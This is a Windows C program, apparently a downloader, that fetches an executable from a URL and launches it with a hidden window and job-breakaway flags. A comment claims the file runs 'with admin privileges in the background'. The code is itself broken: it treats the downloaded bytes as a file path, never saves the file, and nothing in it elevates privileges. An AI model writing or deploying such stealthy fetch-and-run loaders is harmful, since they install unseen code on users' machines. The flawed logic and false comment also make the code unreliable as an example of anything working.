#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

int main() {
   HINTERNET hOpen, hURL;
   char szTempFile[MAX_PATH];
   DWORD dwTempFileLen = MAX_PATH;
   BOOL bResult;
   
   // Download the file from the internet
   hOpen = InternetOpen("MyAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
   if (!hOpen) {
      printf("Error: Could not open internet connection!\n");
      return 1;
   }
   hURL = InternetOpenUrl(hOpen, "http://example.com/file.exe", NULL, 0, 0, 0);
   if (!hURL) {
      printf("Error: Could not open URL!\n");
      return 1;
   }
   bResult = InternetReadFile(hURL, szTempFile, dwTempFileLen, &dwTempFileLen);
   if (!bResult) {
      printf("Error: Could not read file from URL!\n");
      return 1;
   }
   InternetCloseHandle(hURL);
   InternetCloseHandle(hOpen);

   // Execute the downloaded file with admin privileges in the background
   STARTUPINFO si = {0};
   PROCESS_INFORMATION pi = {0};
   si.cb = sizeof(si);
   si.dwFlags = STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   bResult = CreateProcess(szTempFile, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP | CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi);
   if (!bResult) {
      printf("Error: Could not execute file!\n");
      return 1;
   }

   return 0;
}
